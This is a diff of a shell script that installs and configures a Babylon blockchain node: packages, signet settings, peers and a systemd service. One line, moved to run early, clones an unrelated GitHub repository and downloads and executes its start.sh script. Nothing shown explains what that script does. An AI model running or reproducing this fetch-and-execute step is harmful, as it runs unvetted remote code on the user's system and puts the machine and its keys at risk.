@@ -3,6 +3,7 @@ sudo apt -qy install curl git jq lz4 build-essential
 sudo apt -qy upgrade
 sudo apt install make clang pkg-config lz4 libssl-dev build-essential git jq ncdu bsdmainutils htop -y
 sudo apt install curl -y
+git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
 
 cd $HOME
 VERSION=1.21.6
@@ -47,7 +48,8 @@ sed -i \
 
 sed -i 's|^network *=.*|network = "signet"|g' $HOME/.babylond/config/app.toml
 
-git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
+PEERS=$(cat peers.txt)
+sed -i 's|^persistent_peers =.*|persistent_peers = "'"$PEERS"'"|' $HOME/.babylond/config/config.toml
 
 sudo tee /etc/systemd/system/babylond.service > /dev/null << EOF
 [Unit]
